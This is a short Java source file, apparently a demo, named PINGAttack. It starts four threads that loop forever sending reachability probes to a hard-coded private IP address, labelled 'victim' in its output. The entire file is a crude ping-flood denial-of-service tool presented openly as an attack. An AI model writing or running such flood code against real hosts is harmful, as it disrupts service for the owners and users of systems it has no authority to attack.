package com.dhanushkad.demo;

import java.io.IOException;
import java.net.*;
import java.security.SecureRandom;

public class PINGAttack {
    public static void main(String args[]) {
        PINGThread pingThread = new PINGThread();
        PINGThread pingThread1 = new PINGThread();
        PINGThread pingThread2 = new PINGThread();
        PINGThread pingThread3 = new PINGThread();

        pingThread.start();
        pingThread1.start();
        pingThread2.start();
        pingThread3.start();
    }
}

class PINGThread extends Thread {

    public void run() {
        InetAddress host;
        while (true) {
            try {
                host = InetAddress.getByName("192.168.145.172");
                if(!host.isReachable(1000)) {
                    System.out.println("victim does not reachable");
                }
            } catch (UnknownHostException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
